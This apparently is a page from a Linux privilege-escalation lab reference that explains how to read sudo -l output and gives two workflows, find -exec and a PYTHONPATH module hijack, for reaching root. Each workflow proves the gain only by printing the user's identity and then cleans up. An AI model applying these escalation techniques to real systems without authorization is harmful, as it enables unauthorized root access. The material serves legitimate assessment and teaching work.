# Sudo rules and command behavior

[← Linux quick reference](../03-linux-privesc.md) · [Enumeration](enumeration.md) · [Root-run dependencies](root-run.md)

Start with an observed rule and the behavior of its allowed program. Record the run-as account, executable, permitted arguments, authentication requirement, environment, and resulting identity. A rule that reaches another account may reveal a second set of files or sudo rules before it reaches root.

## Discover the effective policy

Run these commands from the existing low-privileged session on the Linux host:

```bash
id
sudo -V | head -n 1
sudo -n -l
sudo -ll
```

`-n` prevents a password prompt; a password-required error does not establish that there are no usable rules. Use a known password through the normal prompt when applicable. Repeating `-l` produces a longer listing. As an unprivileged user, `sudo -V` does not expose all the configuration information available to root. [sudo manual](https://man7.org/linux/man-pages/man8/sudo.8.html).

For an interesting entry, resolve the installed program and inspect referenced files:

```bash
command -v find python3 tar
ls -l /usr/bin/find /usr/bin/python3
namei -l /opt/reports/status.py
sed -n '1,160p' /opt/reports/status.py
```

Use the paths from the actual policy. A familiar program name does not establish the behavior of a custom wrapper, another installed version, or a fixed-argument invocation.

## Read each field before selecting a technique

Illustrative `sudo -l` output:

```text
Matching Defaults entries for student on lab:
    env_reset, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User student may run the following commands on lab:
    (root) NOPASSWD: /usr/bin/find
    (backup) /usr/bin/tar -cf /var/backups/home.tar /home/student
    (root) NOPASSWD: SETENV: /usr/bin/python3 /opt/reports/status.py
```

| Field | Interpretation |
| --- | --- |
| `(root)`, `(backup)`, `(ALL : ALL)` | Permitted run-as users and, where specified, groups; select an allowed account with `-u`. |
| `NOPASSWD` / `PASSWD` | Authentication behavior for the matched command; tags can change within a list. |
| No arguments after the executable | Any arguments are permitted. An explicit `""` permits no arguments. |
| Fixed arguments / wildcards / regex | Match the permitted invocation. Argument wildcards can span whitespace and `/`; anchored regular expressions are supported from sudo 1.9.10. |
| `env_reset`, `env_keep` | Determine which inherited variables survive. |
| `SETENV` / `NOSETENV` | Control environment overrides, including command-line assignments. |
| `secure_path` | Supplies the command's PATH; your interactive PATH is insufficient evidence. |
| `NOEXEC`, `INTERCEPT` | May block or check child execution; evaluate behavior on the installed build. |

These fields and their matching rules are defined by the [sudoers policy manual](https://man7.org/linux/man-pages/man5/sudoers.5.html). Read the complete effective listing, including exclusions and tags, rather than selecting a technique from one matching word.

## Match the program's behavior to the permission

| Observed behavior | Useful next check |
| --- | --- |
| Starts another command, interpreter, editor, or pager | Whether the permitted arguments expose that behavior and whether the child retains the run-as identity. |
| Reads a caller-selected file | Read a known protected lab file; record the path and whose data it contains. |
| Writes a caller-selected file | Confirm overwrite/append behavior and destination ownership/mode; use [file-write notes](file-write.md). |
| Executes a fixed script | Inspect its imports, configuration, helpers, working directory, and writable dependencies. |
| Allows `sudoedit` | Identify exactly which file can be changed and which privileged process consumes it. |

Use [GTFOBins](https://gtfobins.org/) to find candidate behavior, then adapt it to the installed binary and permitted invocation. Enumeration highlights a possible path; a harmless identity or read result establishes what it actually grants.

## Workflow 1: unrestricted arguments to a command runner

**Observed prerequisite:** the policy allows `/usr/bin/find` as root with unrestricted arguments. The installed `find` supports `-exec`; child execution is available. No privileged file needs to be changed.

First check the exact invocation against the policy, then execute an identity proof:

```bash
id
sudo -u root -l /usr/bin/find . -maxdepth 0 -exec /usr/bin/id \;
sudo -u root /usr/bin/find . -maxdepth 0 -exec /usr/bin/id \;
```

The starting directory exists and `-maxdepth 0` limits processing to that entry. Expected output from the second command includes `uid=0(root)` when root is the allowed run-as account. This proves that `find` executed the chosen program with that identity. Keep the earlier `id` output to show the boundary crossed. GTFOBins documents `find` command execution under [sudo](https://gtfobins.org/gtfobins/find/).

If the policy permits only an exact search command, adding `-exec` may fail to match. If `find` reports that it cannot execute `id`, investigate child-execution restrictions and the executable path; the outer command's exit status alone is insufficient proof. Cleanup consists of exiting any additional session you opened; this identity proof creates no files.

## Workflow 2: fixed Python script with controllable module search

**Observed prerequisites:** the rule permits the exact command below as root with `SETENV`; the readable script imports `report_helpers` and calls `show_status()`. No earlier search location contains that module, and the script does not replace the import path or use an isolated interpreter. Match the real module name and API after inspecting the script.

```text
(root) NOPASSWD: SETENV: /usr/bin/python3 /opt/reports/status.py
```

Relevant portion of the existing script:

```python
import report_helpers
report_helpers.show_status()
```

Create a separate proof module that only prints identity, then pass the environment to the allowed invocation:

```bash
proof_dir=$(mktemp -d /tmp/sudo-module-proof.XXXXXX)
cat > "$proof_dir/report_helpers.py" <<'PY'
import os

def show_status():
    print(f"proof: uid={os.getuid()} euid={os.geteuid()}")
PY

sudo -u root PYTHONPATH="$proof_dir" PYTHONDONTWRITEBYTECODE=1 \
  /usr/bin/python3 /opt/reports/status.py
```

Expected output is `proof: uid=0 euid=0`. It shows that the privileged interpreter imported the controlled module. `PYTHONDONTWRITEBYTECODE` avoids a root-owned bytecode cache in the proof directory. `PYTHONPATH` adds module-search locations; the script directory can take precedence, and `-E` or `-I` ignores Python environment variables. [Python command-line/environment documentation](https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH).

Remove the file and directory created for this proof:

```bash
rm -- "$proof_dir/report_helpers.py"
rmdir -- "$proof_dir"
unset proof_dir
```

The original script and trusted module were not replaced. If the directory is not empty, inspect it and remove only artifacts created by this attempt. Do not run an unfamiliar reporting script merely because it imports a module: inspect its other actions and choose a proof appropriate to those actions.

## Diagnose a failed path

| Result | Check next |
| --- | --- |
| Password or terminal required | Authentication policy and terminal state; `NOPASSWD` must apply to this command. |
| Command not allowed | Run-as account, resolved executable, exact arguments, exclusions, and tag scope. |
| Environment assignment rejected | Effective `SETENV`/`NOSETENV` and the permitted variable rules. |
| Original Python output remains | Which module was imported, script-directory precedence, environment isolation, and path changes in the script. |
| Child command denied | `NOEXEC`, `INTERCEPT`, filesystem execution restrictions, and the selected child path. |
| Identity is another non-root user | The rule granted that account; inspect its access and policy as a separate step. |
| Root identity inside a container | Establish the namespace/daemon context before claiming host access; see [containers](groups-and-nfs.md). |

## Deeper checks and restoration

`sudoedit` runs the editor with the invoking user's permissions and installs changes back into the authorized destination. A shell escape from that editor therefore does not establish root execution. Current sudo also restricts symlink and writable-directory editing by default. Evaluate the destination's privileged consumer; capture contents and metadata before a change and restore them after the proof. [sudo editing behavior](https://man7.org/linux/man-pages/man8/sudo.8.html).

For preserved loader variables, distinguish `sudo VAR=value command` from exporting a variable before executing sudo. Secure execution can strip `LD_PRELOAD`/`LD_LIBRARY_PATH` before sudo receives them, and those variables behave differently for SUID programs. Inspect the actual policy and loader behavior instead of treating `sudo -E` as unrestricted preservation. [Dynamic-linker secure-execution documentation](https://man7.org/linux/man-pages/man8/ld.so.8.html).

Keep package vulnerabilities on the [kernel/package applicability](kernel-checks.md) page. A version string or GTFOBins entry is a starting point; it does not establish an affected build or a usable rule.

## Review and validation

Sources reviewed on 2 October 2026. Local syntax and unprivileged fixtures were checked with sudo 1.9.16p2 help, GNU findutils 4.10.0, Bash 5.2.37, and Python 3.13.5. The fixtures verified command-runner and module-search behavior, including Python environment isolation; they did not install a sudo rule or execute either workflow as root. Validate the observed policy and elevated result on the assessment host before recording success.
